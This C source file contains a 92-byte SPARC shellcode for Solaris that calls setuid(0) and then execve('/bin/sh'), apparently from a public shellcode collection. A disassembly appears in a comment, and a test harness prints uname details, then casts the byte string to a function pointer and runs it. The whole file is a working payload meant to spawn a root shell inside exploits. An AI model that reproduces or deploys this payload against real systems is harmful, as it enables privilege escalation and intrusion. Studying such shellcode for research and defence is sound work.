#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/utsname.h>
#include <unistd.h>

/*
 * SunOS (Solaris) / (sun4u / sparc32) setuid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
 * 92 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@galactic.demon.co.uk>
 *
 * Tested on: SunOS leviathan 5.6 Generic_105181-30 sun4u sparc SUNW.Ultra-1
 *
 * Disassembly of section .text:
 *
 * 00010074 <_start>:
 * 10074: 90 10 20 c0   mov  0xc0, %o0
 * 10078: 90 22 20 c0   sub  %o0, 0xc0, %o0
 * 1007c: 82 10 20 17   mov  0x17, %g1
 * 10080: 91 d0 20 10   ta  0x10
 * 10084: 90 10 20 c0   mov  0xc0, %o0
 * 10088: 90 22 20 c0   sub  %o0, 0xc0, %o0
 * 1008c: d0 23 bf fc   st  %o0, [ %sp + -4 ]
 * 10090: 11 1b 8b dc   sethi  %hi(0x6e2f7000), %o0
 * 10094: 90 12 23 68   or  %o0, 0x368, %o0 ! 6e2f7368 <__bss_start+0x6e2d7298>
 * 10098: d0 23 bf f8   st  %o0, [ %sp + -8 ]
 * 1009c: 11 0b cb d8   sethi  %hi(0x2f2f6000), %o0
 * 100a0: 90 12 22 69   or  %o0, 0x269, %o0 ! 2f2f6269 <__bss_start+0x2f2d6199>
 * 100a4: d0 23 bf f4   st  %o0, [ %sp + -12 ]
 * 100a8: 90 23 a0 0c   sub  %sp, 0xc, %o0
 * 100ac: 92 10 20 c0   mov  0xc0, %o1
 * 100b0: 92 22 60 c0   sub  %o1, 0xc0, %o1
 * 100b4: d2 23 bf f0   st  %o1, [ %sp + -16 ]
 * 100b8: d0 23 bf ec   st  %o0, [ %sp + -20 ]
 * 100bc: 92 23 a0 14   sub  %sp, 0x14, %o1
 * 100c0: 94 10 20 c0   mov  0xc0, %o2
 * 100c4: 94 22 a0 c0   sub  %o2, 0xc0, %o2
 * 100c8: 82 10 20 3b   mov  0x3b, %g1
 * 100cc: 91 d0 20 10   ta  0x10
 */

#ifndef __sect_shellcode
#define __sect_shellcode __attribute__((section(".sect.shellcode")))
#endif

#ifndef __cold
#define __cold __attribute__((cold))
#endif

#ifndef __unvalidate_cfi
#define __unvalidate_cfi
#endif

#ifndef __unsafe
#define __unsafe __sect_shellcode __cold __unvalidate_cfi
#endif

#ifndef unused
#define unused(x) ((void)(x))
#endif

static char *shellcode = "\x90\x10\x20\xc0\x90\x22\x20\xc0"
                         "\x82\x10\x20\x17\x91\xd0\x20\x10"
                         "\x90\x10\x20\xc0\x90\x22\x20\xc0"
                         "\xd0\x23\xbf\xfc\x11\x1b\x8b\xdc"
                         "\x90\x12\x23\x68\xd0\x23\xbf\xf8"
                         "\x11\x0b\xcb\xd8\x90\x12\x22\x69"
                         "\xd0\x23\xbf\xf4\x90\x23\xa0\x0c"
                         "\x92\x10\x20\xc0\x92\x22\x60\xc0"
                         "\xd2\x23\xbf\xf0\xd0\x23\xbf\xec"
                         "\x92\x23\xa0\x14\x94\x10\x20\xc0"
                         "\x94\x22\xa0\xc0\x82\x10\x20\x3b"
                         "\x91\xd0\x20\x10";

int __unsafe main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret;
  struct utsname uts;

  // add 2 unused parameters to make
  // %fp register properly aligned.
  void (*trigger)(int a, int b);

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __fallback;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  trigger = (void (*)(int, int))shellcode;

  printf("[*] Executing the shellcode..\n");
  trigger(0, 0);

  return 0;

__fallback:
  return ret;
}
